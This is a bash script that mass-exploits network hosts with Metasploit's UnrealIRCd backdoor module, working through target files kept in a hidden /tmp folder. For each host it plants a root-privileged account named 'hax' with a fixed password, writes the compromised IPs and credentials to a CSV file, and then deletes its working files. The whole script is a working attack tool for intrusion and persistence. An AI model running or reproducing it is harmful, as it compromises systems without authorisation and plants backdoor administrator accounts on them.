#!/bin/bash

#This bash script uses the created target files to attack machines on the network.
#It creates a CSV file of the exploited machines' IP, username, and password.

FOLDER=/tmp/.attack-files
QUIET=0
TARGNUM=0


#####Throws All Target Files Into a List#####

ls $FOLDER/target?.txt > $FOLDER/target_list.txt
TARGLIST=$FOLDER/target_list.txt

if [ "$1" == "-q" ]; then
	QUIET=1	
fi

if [ ! -d $FOLDER ]; then
	if [ $QUIET -eq 0 ]; then
		echo No folder found, exiting...
	fi
	exit -1
fi

if [ ! -s $TARGLIST ]; then
	if [ $QUIET -eq 0 ]; then
		echo No targets found, exiting...
	fi
	exit 1
fi

if [ -s $FOLDER/ip_list.txt ]; then
	rm -f $FOLDER/ip_list.txt
fi

if [ -s $FOLDER/results.csv ]; then
	rm -f $FOLDER/results.csv
fi


#####This Block:
#Reads Each Entry From the List
#Backdoors Vulnerable Unix Targets
#Creates a CSV File Containing Backdoor Information#####

while read line; do

	TARGNUM=$(($TARGNUM + 1))
	TARGET=`cat $FOLDER/target$TARGNUM.txt`
	
	echo '#!/bin/bash' > $FOLDER/rhost_setter.rc
	echo '' >> $FOLDER/rhost_setter.rc
	echo set RHOST $TARGET >> $FOLDER/rhost_setter.rc
	
	if [ $QUIET = 1 ]; then	
		msfconsole -q -x "\
	use exploit/unix/irc/unreal_ircd_3281_backdoor; \
	resource /tmp/.attack-files/rhost_setter.rc; exploit -j; sleep 42; \
	sessions -c 'echo hax:x:0:0:root:/root:/bin/bash >> /etc/passwd'; \
	sessions -c 'echo hax:1337 | chpasswd'; sessions -K; exit" > /dev/null
	else
		msfconsole -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; \
	resource /tmp/.attack-files/rhost_setter.rc; exploit -j; sleep 42; \
	sessions -c 'echo hax:x:0:0:root:/root:/bin/bash >> /etc/passwd'; \
	sessions -c 'echo hax:1337 | chpasswd'; sessions -K; exit"
	fi

	echo $TARGET,hax,1337 >> $FOLDER/results.csv

done < $TARGLIST

rm $FOLDER/*.txt $FOLDER/*.rc
